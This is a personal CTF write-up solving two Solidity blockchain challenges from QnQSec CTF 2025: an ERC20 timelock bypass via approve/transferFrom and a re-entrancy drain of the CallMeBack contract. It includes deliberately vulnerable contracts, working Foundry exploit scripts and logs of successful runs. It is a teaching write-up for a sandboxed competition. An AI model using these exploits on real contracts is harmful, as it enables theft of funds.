---
layout: default
title: "QnQSec CTF - 2025"
# date: 2025-09-16
categories: Security CTF's BlockChain
---

18-10-2025 — Today I took part in `QnQSec CTF 2025 `and solved two Blockchain challenges. They were a bit easy for me because I had already solved similar ones before. But the hard part was interacting with the given details and getting the flag correctly.

I put my writeups below for those two blockchain challenges.

# 1. Timelock

**Description :** Your grandpa gave you some coins, but you cannot spend them for 10 years. Can you hack and spend them today?

`nc 161.97.155.116 6970`

Given Files 

**Timelock.sol**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Timelock is ERC20 {
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        }
    }
}
```
**Challenge.sol**
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Timelock.sol";

contract Challenge {
    address public immutable PLAYER;
    Timelock public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        
        CONTRACT = Timelock(payable(_contract));
    }

    function solve() external {
        require(CONTRACT.balanceOf(PLAYER) == 0, "COINS_NOT_SPENT");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
```
The modifier that restricts me from making token transactions is only applied to the `transfer()` function.
However, since the `ERC20` standard also includes `approve()` and `transferFrom()`, I can approve another address to spend tokens on my behalf.
In the end, my goal is to make the `PLAYER` balance equal to `0`.

NOTE : should know about ERC20 standard  and it's functions.

Here is my foundry script file that has solved the challenge 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/Timelock.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Challenge.sol";

contract Exploit {
    
    Timelock public token;
    address public player;

    constructor (Timelock _token, address _player) {
        token = _token;
        player = _player; 
    }

    function TokenTransferFrom(address to, uint256 amount) public {
        require(token.transferFrom(player, to, amount), "transferFrom failed");
    }
}



contract TimeLockScript is Script {
    function run() external {
        address CHALLENEG_ADDRESS = vm.envAddress("TIMELOCK_ADDR");   
        uint256 pk = vm.envUint("PRIVATE_KEY");       

        address player = vm.addr(pk);
        console.log("derived player:", player);
        console.log("timelock addr :", CHALLENEG_ADDRESS);
        
         
       
        vm.startBroadcast(pk);

        Challenge chall = Challenge(CHALLENEG_ADDRESS);
        address timelockAddr1 = address(chall.CONTRACT());
        Timelock timelockAddr = Timelock(timelockAddr1);
        console.log("timelock contract addr :", address(timelockAddr));
            
        uint256 before = timelockAddr.balanceOf(player);
        console.log("player balance before:", before); 
        Exploit exploit = new Exploit(timelockAddr, player);
            timelockAddr.approve(address(exploit), timelockAddr.INITIAL_SUPPLY());
            exploit.TokenTransferFrom(address(0x1), timelockAddr.INITIAL_SUPPLY());
        uint256 afterBal = timelockAddr.balanceOf(player);
        console.log("player balance after:", afterBal);

        chall.solve();

        vm.stopBroadcast(); 
       
}
}
```

I got the player's private key (extracted address using this key) and the challenge contract address from `nc 161.97.155.116 6970` command.

Terminal 1

```terminal
(base) sunil-kumar@DESKTOP-GBKN3LB:~/Desktop/qnqsecCTF/QnQsec$ nc 161.97.155.116 6970

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[timelock] Welcome anon!
[timelock] 1 - Launch a new instance
[timelock] 2 - Kill your instance
[timelock] 3 - Get the flag
[timelock] Action? 1

[timelock] Your ticket: ccaf78dde1e2a29a6840c866aa5351f2

[timelock] Creating private blockchain...
[timelock] Deploying challenge.. (please be patient, this can take a while)

[timelock] Your private blockchain has been set up,
[timelock] it will automatically terminate in 15.0 minutes!

[timelock] RPC Endpoints:
[timelock]     - http://161.97.155.116:8545/dIfSygcqmwEQkfJOOLhrZeaR/main
[timelock]     - ws://161.97.155.116:8545/dIfSygcqmwEQkfJOOLhrZeaR/main/ws

[timelock] The Player private key:         0xbd39d5cabdfab4c7a504b0805ee0bd4eebcafc4a079e5144aed0df70eb21903d
[timelock] The Challenge contract address: 0x858B54972ACc706e5beb4f7bFC9F7781F0Ea8448
```
Terminal 2

```terminal
(base) sunil-kumar@DESKTOP-GBKN3LB:~/Desktop/qnqsecCTF/QnQsec$ forge script script/TimeLock.s.sol:TimeLockScript --rpc-url "http://161.97.155.116:8545/dIfSygcqmwEQkfJOOLhrZeaR/main" --private-key $PRIVATE_KEY --broadcast
[⠒] Compiling...
[⠑] Compiling 1 files with Solc 0.8.30
[⠘] Solc 0.8.30 finished in 1.49s
Compiler run successful with warnings:
Warning (2462): Visibility for constructor is ignored. If you want the contract to be non-deployable, making it "abstract" is sufficient.
  --> src/Challenge.sol:12:5:
   |
12 |     constructor(address player, address _contract) public {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
  --> src/Timelock.sol:18:88:
   |
18 |     function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
   |                                                                                        ^^^^

Script ran successfully.

== Logs ==
  derived player: 0x89D8C7b1A6F568f9D677eD8322f85C0ae43E0D9e
  timelock addr : 0x858B54972ACc706e5beb4f7bFC9F7781F0Ea8448
  timelock contract addr : 0x6Aac308e6a805CE312A59Fb29a291619C3B63D1c
  player balance before: 1000000000000000000000000
  player balance after: 0

## Setting up 1 EVM.

==========================

Chain 31337

Estimated gas price: 1.768103285 gwei

Estimated total gas used for script: 684550

Estimated amount required: 0.00121035510374675 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0x4a5fa7b058a1cf6dc9b161f1ce928febe7242822d4c38c71d2ef6844d4e254c0
Block: 4
Paid: 0.00003196864983486 ETH (46940 gas * 0.681053469 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0xfe95bd4a927273ad97fe78cbf352a2c63e19b49ac8013cf86c47e6dbe506e82e
Block: 4
Paid: 0.000038539453703772 ETH (56588 gas * 0.681053469 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x657806425e1004b7455755f881e6dd4a11fc90b451a93c3db0b054aea6592c5e
Contract Address: 0x6780A64F6914F7D24B9402D867e214064057e278
Block: 3
Paid: 0.00027997408393694 ETH (360940 gas * 0.775680401 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x52abebdf29a2d5c9aa4e2e986fa3ae79dc50eef0fa96ef71c04af511bd19701c
Block: 4
Paid: 0.000033684223523271 ETH (49459 gas * 0.681053469 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000384166410998843 ETH (513927 gas * avg 0.704710202 gwei)
                                                                                                                                      

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/sunil-kumar/Desktop/qnqsecCTF/QnQsec/broadcast/TimeLock.s.sol/31337/run-latest.json

Sensitive values saved to: /home/sunil-kumar/Desktop/qnqsecCTF/QnQsec/cache/TimeLock.s.sol/31337/run-latest.json
```
Terminal 3 

```terminal
(base) sunil-kumar@DESKTOP-GBKN3LB:~/Desktop/qnqsecCTF/QnQsec$ nc 161.97.155.116 6970

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[timelock] Welcome anon!
[timelock] 1 - Launch a new instance
[timelock] 2 - Kill your instance
[timelock] 3 - Get the flag
[timelock] Action? 3

[timelock] What is your ticket? ccaf78dde1e2a29a6840c866aa5351f2
[timelock] Nicely done! Now don't lose it: QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}
```
**FLAG :** `QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}`
---
# 2. CallMeBack

**Description :** An attacker can steal all the funds in the CallMeBack contract. Can you show me how?

`nc 161.97.155.116 6969`

Given Files 

CallMeBack.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract CallMeBack {

    mapping(address => uint256) public balances;

    function donate() public payable {
        balances[msg.sender] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool success,) = msg.sender.call{value: _amount}("");
            require(success, "ETH transfer failed");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

Challenge.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "src/CallMeBack.sol";

contract Challenge {
    address public immutable PLAYER;
    CallMeBack public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        
        CONTRACT = CallMeBack(payable(_contract));
    }

    function solve() external {
        require(address(PLAYER).balance > 10 ether, "NOT_ENOUGH_ETHER");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
```
The `withdraw()` function in the `CallMeBack` contract has `Re-entrancy Vulnerability` as it is not Following CEI (Checks , Effects , Interactions).So it is a basic Re-entrancy Attack.

**Solution**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/CallMeBack.sol";
import "../src/Challenge.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Exploit {
    CallMeBack public callmeback;
    address payable public owner;

    constructor (CallMeBack _callmeback) public payable {
        owner = msg.sender;
        callmeback = _callmeback;
    }

    function attack() public payable {
         // donate from this contract using the ETH sent to constructor
        callmeback.donate{value: msg.value}();

        // start withdraw -> receive() will re-enter repeatedly
        callmeback.withdraw(1 ether);

        // forward all balance to owner (player)
        if (address(this).balance > 0) {
            (bool ok, ) = owner.call{value: address(this).balance}("");
            require(ok, "forward failed");
        }
    }

    receive() external payable {
        if (address(callmeback).balance >= 1 ether) {
            callmeback.withdraw(1 ether);
        }
    }
}


contract callmebackScript is Script {
    function run() external {
        address chall = vm.envAddress("CHALLENGE_ADDRESS");
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(pk);

        Challenge challengeAddress = Challenge(chall);
        CallMeBack callmeback = CallMeBack(challengeAddress.CONTRACT());

        console.log("derived player:", player);
        console.log("player bal before (wei):", address(player).balance);
        console.log("contract bal before (wei):", address(callmeback).balance);

        vm.startBroadcast(pk);

        Exploit ex = new Exploit{value: 1 ether}(callmeback);
        ex.attack{value : 1 ether}();

        console.log("contract bal after (wei):", address(callmeback).balance);
        challengeAddress.solve();
        vm.stopBroadcast();

        console.log("player bal after (wei):", address(player).balance);
        
    }
}
```
Terminal 1 

```terminal
(base) sunil-kumar@DESKTOP-GBKN3LB:~/Desktop/qnqsecCTF/callmeback/callmebackCTF$ nc 161.97.155.116 6969

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[callmeback] You dare challenge me?
[callmeback] 1 - Launch a new instance
[callmeback] 2 - Kill your instance
[callmeback] 3 - Get the flag
[callmeback] Action? 1

[callmeback] Your ticket: 45c9479f51ac97535293294c1d944d51

[callmeback] Creating private blockchain...
[callmeback] Deploying challenge.. (please be patient, this can take a while)

[callmeback] Your private blockchain has been set up,
[callmeback] it will automatically terminate in 15.0 minutes!

[callmeback] RPC Endpoints:
[callmeback]     - http://161.97.155.116:8545/QpOzfjzzeZHPuADmzYPfZJEP/main
[callmeback]     - ws://161.97.155.116:8545/QpOzfjzzeZHPuADmzYPfZJEP/main/ws

[callmeback] The Player private key:         0xc9e5dd4f077e2ae1dd662096f2c1a3bc5f7bd8445b9cadce6d77cdd1b27f4b1a
[callmeback] The Challenge contract address: 0x60De04C6075E9968774e64666352A7853025042d
```

Terminal 2

```terminal 
(base) sunil-kumar@DESKTOP-GBKN3LB:~/Desktop/qnqsecCTF/callmeback/callmebackCTF$ forge script script/Callmeback.s.sol:callmebackScript --rpc-url "http://161.97.155.116:8545/QpOzfjzzeZHPuADmzYPfZJEP/main" --private-key $PRIVATE_KEY --broadcast
[⠒] Compiling...
[⠰] Compiling 1 files with Solc 0.6.12
[⠔] Solc 0.6.12 finished in 2.18s
Compiler run successful!
Script ran successfully.

== Logs ==
  derived player: 0x5c73d2960126Eec9748C3EABd39dEF2b23991380
  player bal before (wei): 10000000000000000000
  contract bal before (wei): 1000000000000000000
  contract bal after (wei): 0
  player bal after (wei): 11000000000000000000

## Setting up 1 EVM.

==========================

Chain 31337

Estimated gas price: 1.537663563 gwei

Estimated total gas used for script: 617312

Estimated amount required: 0.000949218169402656 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0x1244c4c0daa28dcc2de550d44828fd130b4e74d3aac17e178f67cc31bae33cad
Contract Address: 0x6C0afb50Fd68e81ce4f4782a9A32aeCb7069D4cA
Block: 4
Paid: 0.000226825293549105 ETH (337033 gas * 0.673006185 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x7580ab6cf98894d0140649a647cef0ac139ec5cb8ddcc84dbd7e6b821580b746
Block: 5
Paid: 0.000048090501024069 ETH (81403 gas * 0.590770623 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0xb6fe39cfe50f448fbb92778cc9d0c41ebc434968645bc338d7aeece840afd8a7
Block: 6
Paid: 0.0000225170901263 ETH (43526 gas * 0.51732505 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000297432884699474 ETH (461962 gas * avg 0.593700619 gwei)
                                                                                                                                      

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/sunil-kumar/Desktop/qnqsecCTF/callmeback/callmebackCTF/broadcast/Callmeback.s.sol/31337/run-latest.json

Sensitive values saved to: /home/sunil-kumar/Desktop/qnqsecCTF/callmeback/callmebackCTF/cache/Callmeback.s.sol/31337/run-latest.json
```

Terminal 3 

```terminal
(base) sunil-kumar@DESKTOP-GBKN3LB:~/Desktop/qnqsecCTF/callmeback/callmebackCTF$ nc 161.97.155.116 6969

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[callmeback] Welcome anon!
[callmeback] 1 - Launch a new instance
[callmeback] 2 - Kill your instance
[callmeback] 3 - Get the flag
[callmeback] Action? 3

[callmeback] What is your ticket? 45c9479f51ac97535293294c1d944d51
[callmeback] Nicely done! Now don't lose it: QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}
```
**Flag :** `QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}`
